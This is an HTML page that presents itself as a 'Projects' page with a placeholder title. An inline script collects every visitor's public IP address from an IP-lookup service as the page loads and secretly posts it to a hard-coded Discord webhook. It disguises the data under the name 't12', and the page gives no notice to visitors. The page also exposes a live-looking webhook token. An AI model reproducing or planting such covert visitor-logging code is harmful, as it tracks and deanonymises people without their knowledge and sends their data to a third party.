<!DOCTYPE html>
<html>
<head>
    <title>Your Page Title</title>
</head>
<body>
    <h1>Projects</h1>
    <script>
        function sendToDiscord(t12) {
            var discordWebhookUrl = 'https://discord.com/api/webhooks/1172650838573994004/pUY4IiCu2Tbb-KN8Iep2oeA8DFOZakqLabsn7pkYuNZsxUnKF0UiGI4wO_Pn4KMrUHQx';
            var payload = JSON.stringify({
                content: "t12: " + t12
            });

            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: payload
            })
            .then(response => console.log('t12 sent to Discord'))
            .catch(error => console.error('Error:', error));
        }

        // fetch the t12
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                sendToDiscord(data.ip);
            })
            .catch(error => {
                console.error('Error fetching t12:', error);
            });
    </script>
</body>
</html>
